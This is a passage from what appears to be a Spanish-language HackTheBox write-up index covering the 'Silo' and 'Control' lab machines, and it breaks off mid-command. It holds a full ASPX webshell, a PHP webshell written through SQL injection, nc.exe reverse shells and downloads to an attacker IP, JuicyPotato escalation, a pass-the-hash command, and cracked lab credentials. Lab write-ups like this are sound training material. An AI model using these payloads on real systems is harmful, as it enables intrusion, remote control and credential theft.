puede verificar que tambi\u00e9n exista la capacidad de escribir a un archivo, verific\u00e1ndolo con el siguiente segmento de c\u00f3digo.</p> <pre><code>declare\n    f utl_file.file_type;\n    s varchar(5000) := 'Hello world';\nbegin\n    f := utl_file.fopen('/inetpub/wwwroot', 'srrequiem.txt', 'W');\n    utl_file.put_line(f,s);\n    utl_file.fclose(f);\nend;\n</code></pre> <p></p> <p></p> <p>Una vez validada la escritura, se abre la puerta a la creaci\u00f3n de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se opt\u00f3 por una webshell en su lugar.</p> <p>Utilizando <code>/usr/share/webshells/aspx/cmdasp.aspx</code> eliminando estilos, comentarios y saltos de l\u00ednea para reducir los caracteres se obtuvo ejecuci\u00f3n en la m\u00e1quina.</p> <p>C\u00f3digo de p\u00e1gina empleado:</p> <pre><code>&lt;%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %&gt;&lt;%@ Import Namespace=\"System.Diagnostics\" %&gt;&lt;%@ Import Namespace=\"System.IO\" %&gt;&lt;script Language=\"c#\" runat=\"server\"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \"cmd.exe\";psi.Arguments = \"/c \"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\"&lt;pre&gt;\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\"&lt;/pre&gt;\");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=\"cmd\" method=\"post\" runat=\"server\"&gt;&lt;asp:TextBox id=\"txtArg\" runat=\"server\" Width=\"250px\"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=\"testing\" runat=\"server\" Text=\"excute\" OnClick=\"cmdExe_Click\"&gt;&lt;/asp:Button&gt;&lt;asp:Label id=\"lblText\" runat=\"server\"&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;\n</code></pre> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Se identific\u00f3 que entre los privilegios disponibles del usuario obtenido se encuentra habilitado <code>SeImpersonatePrivilege</code> lo que lleva a un camino de escalaci\u00f3n de privilegios por medio de Rotten o JuicyPotato.</p> <p></p> <p>Se identific\u00f3 un archivo accesible en el escritorio de uno de los usuarios del sistema <code>c:\\users\\phineas\\desktop\\oracle issue.txt</code> el cual indica que se trata de un dumpeo de memoria del sistema.</p> <p>Contenido:</p> <pre><code>Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):\n\nDropbox link provided to vendor (and password under separate cover).\n\nDropbox link \nhttps://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0\n\nlink password:\n\u00a3%Hm8646uC$\n</code></pre> <p>Nota: Cabe recalcar que el caracter <code>\u00a3</code> puede que no se interprete correctamente si se opt\u00f3 por entablar una reverse shell, causando su omisi\u00f3n y por consiguiente, que a la hora de la descarga indique que la contrase\u00f1a no es v\u00e1lida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existi\u00f3 este problema</p> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#metodo-1-juicy-potato","title":"M\u00e9todo 1 - Juicy Potato","text":"<p>Habiendo encontrado los privilegios relacionados con este m\u00e9todo de escalaci\u00f3n, s\u00f3lo restar\u00eda probar su ejecuci\u00f3n mediante el binario y con las opciones utilizadas para entablar una reverse shell con permisos elevados <code>NT AUTHORITY\\SYSTEM</code>. Ejecutando:</p> <pre><code>.\\jp.exe -t * -l 1337 -p c:\\windows\\temp\\nc.exe -a \" -e cmd.exe 10.10.14.16 4321\"\n</code></pre> <p></p> <p>Con lo que respecta a los argumentos utilizados, el binario mismo da la descripci\u00f3n de cada uno de ellos.</p> <p></p> <p>Con lo que respecta a la pr\u00e1ctica los argumentos <code>-t</code> y <code>-l</code> no representa algo sustancial el cambiar valores. Y en donde <code>-p</code> (programa a ejecutar) y <code>-a</code> (argumentos a utilizar por el programa se\u00f1alado) se usaron a partir de las herramientas usadas en pasos anteriores.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#metodo-2-memdump","title":"M\u00e9todo 2 - Memdump","text":"<p>Con la copia de memoria descargada, se puede hacer uso de volatility para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de:</p> <pre><code>./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo\n</code></pre> <p>Teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil m\u00e1s adecuado.</p> <p></p> <p>Ejecutando <code>systeminfo</code> en la m\u00e1quina se pueden comparar resultados, identificando el perfil <code>Win2012R2x64</code> como el m\u00e1s adecuado.</p> <p></p> <p>Haciendo uso del plugin <code>hashdump</code> se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la m\u00e1quina como el usuario Administrator. Por medio de:</p> <pre><code>./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump\n</code></pre> <p></p> <p>Obteniendo acceso haciendo uso del hash con:</p> <pre><code>impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7\n</code></pre> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#referencias","title":"Referencias","text":"<ul> <li>Hack Tricks - Pentesting Oracle TNS Listener.</li> <li>odat.py.</li> <li>0xdf Write-up.</li> <li>Ippsec Walkthrough.</li> <li>PayloadAllTheThings - JuicyPotato.</li> <li>Binarios Juicy Potato.</li> <li>Releases Volatility.</li> <li>Github Volatility.</li> </ul>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/","title":"Control","text":"<p>Write-up de la m\u00e1quina Control de HackTheBox.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 80</li> <li>Manual</li> <li>ffuf</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Inyecci\u00f3n SQL<ul> <li>Ejecuci\u00f3n</li> </ul> </li> <li>RCE</li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>nt authority\\iusr \u2192 hector</li> <li>hector \u2192 nt authority\\system</li> <li>Usando powershell</li> <li>Usando cmd</li> </ul> </li> <li>Notas adicionales</li> <li>Referencias</li> </ul>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#introduccion","title":"Introducci\u00f3n","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Control OS Windows Dificultad oficial Hard Dificultad de comunidad Puntos 40 Creadores TRX","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#reconocimiento","title":"Reconocimiento","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ sudo nmap -sS --min-rate 5000 -vvv -op\u00e8n -p- -n -Pn -oG nmap/all_ports_ss $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nWarning: The -o option is deprecated. Please use -oN\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT\nInitiating SYN Stealth Scan at 00:44\nScanning 10.10.10.167 [65535 ports]\nDiscovered open port 3306/tcp on 10.10.10.167\nDiscovered open port 135/tcp on 10.10.10.167\nDiscovered open port 80/tcp on 10.10.10.167\nDiscovered open port 49666/tcp on 10.10.10.167\nDiscovered open port 49667/tcp on 10.10.10.167\nCompleted SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports)\nNmap scan report for 10.10.10.167\nHost is up, received user-set (0.064s latency).\nScanned at 2022-06-07 00:44:41 EDT for 26s\nNot shown: 65530 filtered tcp ports (no-response)\nPORT      STATE SERVICE REASON\n80/tcp    open  http    syn-ack ttl 127\n135/tcp   open  msrpc   syn-ack ttl 127\n3306/tcp  open  mysql   syn-ack ttl 127\n49666/tcp open  unknown syn-ack ttl 127\n49667/tcp open  unknown syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 26.48 seconds\n           Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB)\n</code></pre>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT\nNmap scan report for 10.10.10.167\nHost is up (0.064s latency).\n\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Fidelity\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc   Microsoft Windows RPC\n3306/tcp  open  mysql?\n| fingerprint-strings:\n|   NULL:\n|_    Host '10.10.14.16' is not allowed to connect to this MariaDB server\n49666/tcp open  msrpc   Microsoft Windows RPC\n49667/tcp open  msrpc   Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.16'\\x20is\\x20not\\x20allowe\nSF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 61.09 seconds\n</code></pre>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#servicios","title":"Servicios","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#http-80","title":"http - 80","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#manual","title":"Manual","text":"<p>Visualmente no se identific\u00f3 nada relevante, dado que en su mayor\u00eda los textos contienen <code>Lorem ipsum</code> salvo algunas rutas expuestas mediante a la interacci\u00f3n con parte de la interfaz. Visualizando as\u00ed un error en la ruta <code>admin.php</code> despu\u00e9s de dar click al bot\u00f3n de Login.</p> <p></p> <p>Al navegar al c\u00f3digo fuente de la p\u00e1gina inicial, se identificaron dos posibles pistas respecto a la construcci\u00f3n del sitio.</p> <p></p> <ol> <li> <p>La exposici\u00f3n de c\u00f3digo del sitio <code>functions.js</code>.</p> </li> <li> <p>Una posible ruta hacia otro host o algo similar.</p> </li> </ol> <p>Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que dif\u00edcilmente puedan ser encontradas en alg\u00fan diccionario de fuzzing.</p> <p></p> <p>Al identificar la composici\u00f3n de la petici\u00f3n e interactuar con <code>view_products.php</code> haciendo uso de:</p> <pre><code>curl -i http://10.10.10.167/view_product.php -X POST -F \"productId=1\"\n</code></pre> <p>Se puede observar una tabla en html permitiendo la suposici\u00f3n de que se desplegar\u00edan en este sitio los atributos del producto en cuesti\u00f3n.</p> <p></p> <p>Despu\u00e9s de varias iteraciones, buscando un identificador v\u00e1lido (26) se puede visualizar que la suposici\u00f3n era la correcta.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#ffuf","title":"ffuf","text":"<p>Para complementar lo obtenido se buscaron rutas adicionales por medio de:</p> <pre><code>ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html\n</code></pre> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#inyeccion-sql","title":"Inyecci\u00f3n SQL","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Teniendo en cuenta la tecnolog\u00eda empleada y parte de los par\u00e1metros usados, se busc\u00f3 explotar una inyecci\u00f3n SQL haciendo uso de <code>sqlmap</code>, utilizando:</p> <pre><code>sqlmap -u \"http://10.10.10.167/view_product.php\" --data=\"productId=1\" --dbs\n</code></pre> <p>Obteniendo de esta forma payloads v\u00e1lidos y la capacidad de obtener los registros de la base de datos.</p> <ul> <li>Payload: <code>productId=1 UNION ALL SELECT &lt;query&gt;-- -</code></li> </ul> <p></p> <p>Despu\u00e9s no encontrar informaci\u00f3n relevante respecto a la aplicaci\u00f3n web, se busc\u00f3 obtener informaci\u00f3n respecto a los usuarios de la base de datos, mediante:</p> <pre><code>sqlmap -u \"http://10.10.10.167/view_product.php\" --data=\"productId=1\" -D mysql -T user --passwords\n</code></pre> <p>Obteniendo as\u00ed sus hashes.</p> <p></p> <p>A lo que posteriormente, una vez guardados se hizo uso de <code>john</code> para crackearlos.</p> <p></p> <p>Adicional a ello, haciendo uso de CrackStation se obtuvo la contrase\u00f1a de un hash adicional del cu\u00e1l no se obtuvo con <code>john</code>.</p> <p></p> <p>Identificando as\u00ed las credenciales:</p> <pre><code>manager:l3tm3!n\nhector:l33th4x0rhector\n</code></pre>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#rce","title":"RCE","text":"<p>Despu\u00e9s de obtener las credenciales y buscar emplearlas con los servicios expuestos en la m\u00e1quina (mysql \u00fanicamente dado que no se cuenta con <code>smb</code> o alg\u00fan otro servicio en donde se pudieran haber usado) se busc\u00f3 la forma para que mediante la inyecci\u00f3n SQL se para pudiera lograr la ejecuci\u00f3n remota de c\u00f3digo mediante la escritura de un script en php, haciendo uso de instrucciones como <code>INTO OUTFILE</code> o <code>INTO DUMPFILE</code>.</p> <p>Para lograrlo fue necesario identificar el directorio en el que se encuentra la instalaci\u00f3n, de acuerdo al enlace encontrado se indica que por predeterminado la ruta suele ser <code>c:\\inetpub\\wwwroot</code>, permitiendo de esta forma complementar hacia d\u00f3nde deber\u00eda dirigirse la escritura del script.</p> <p>Despu\u00e9s de probar con diferentes payloads respecto al escape de las barras (<code>\\</code>), dado que la respuesta del servidor es identificada como un <code>500 Internal Server Error</code>, se realiz\u00f3 una prueba de la escritura mediante:</p> <pre><code>curl -i http://10.10.10.167/view_product.php -X POST -F \"productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.txt'-- -\"\n</code></pre> <p>Logrando escribir satisfactoriamente al archivo indicado.</p> <p>En este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se est\u00e9 ejecutando el payload indicado.</p> <p></p> <p>Visualizandolo en el servidor.</p> <p></p> <p>Permitiendo de esta manera cambiar el payload a </p> <pre><code>curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT \"&lt;?php system($_GET[\\\"cmd\\\"])?&gt;\" INTO OUTFILE \"c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\srrequiem.php\"-- -'\n</code></pre> <p>Logrando as\u00ed tener un script listo para ejecutar comandos en la m\u00e1quina.</p> <p></p> <p>Por lo que se estableci\u00f3 una reverse shell haciendo uso del binario <code>nc.exe</code>, subi\u00e9ndolo a la m\u00e1quina mediante la request:</p> <pre><code>http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\\windows\\temp\\nc.exe\n</code></pre> <p>Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:</p> <pre><code>http://10.10.10.167/srrequiem.php?cmd=c:\\windows\\temp\\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234\n</code></pre> <p>Logrando as\u00ed acceso de una manera m\u00e1s interactiva.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Al buscar atar cabos sueltos respecto a lo indicado en el c\u00f3digo fuente del sitio, se pudo visualizar que en el contenido del script de <code>admin.php</code> se hace un filtrado de cabeceras indicado por <code>HTTP_X_FORWARDED_FOR</code> buscando la IP indicada <code>192.168.4.28</code>. A lo que por consiguiente si se a\u00f1adiera la cabecera <code>X-Forwarded-For: 192.168.4.28</code> a las peticiones realizadas se visualizar\u00eda el contenido de <code>admin.php</code>, logrando as\u00ed un bypass de la validaci\u00f3n.</p> <p></p>","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["SQL Injection [SQLI] - Error Based","Advanced Bash Scripting (EXTRA)","SQLI to RCE (Into Outfile - PHP File Creation)","ConPtyShell (Fully Interactive Reverse Shell for Windows)","Playing with ScriptBlocks and PSCredential to execute commands as another user","AppLocker Bypass","WinPEAS Enumeration","Service ImagePath Hijacking (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/#nt-authorityiusr-hector","title":"nt authority\\iusr \u2192 hector","text":"<p>Habiendo identificado que existe el usuario <code>hector</code> en el sistema operativo por medio del listado de directorios de <code>c:\\users</code>, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.</p> <p></p> <p>Habiendo encontrado esta y esta referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario <code>hector</code>.</p> <p>Previamente identificando el nombre de la m\u00e1quina y/o hostname con:</p> <pre><code># Cualquiera de los siguientes comandos\nhostname\n$env:COMPUTERNAME\n[Environment]::MachineName\n</code></pre> <p>Seg\u00fan lo indica este blog para encontrar ese valor y usarlo posteriormente.</p> <p></p> <pre><code>$userName = 'fidelity\\hector'\n$userPassword = 'l33th4x0rhector'\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)\nInvoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami }\n</code></pre> <p>Logrando as\u00ed ejecuci\u00f3n como el usuario <code>hector</code>.</p> <p></p> <p>Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de <code>netcat</code> previamente subido debido a permisos, se decidi\u00f3 ejecutar el mismo binario con la diferencia de ejecutarlo a trav\u00e9s de red, exponiendo el binario mediante:</p> <pre><code>impacket-smbserver smbFolder $(pwd) -smb2support\n</code></pre> <p>Y ejecut\u00e1ndolo con:</p> <pre><code>Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 4321 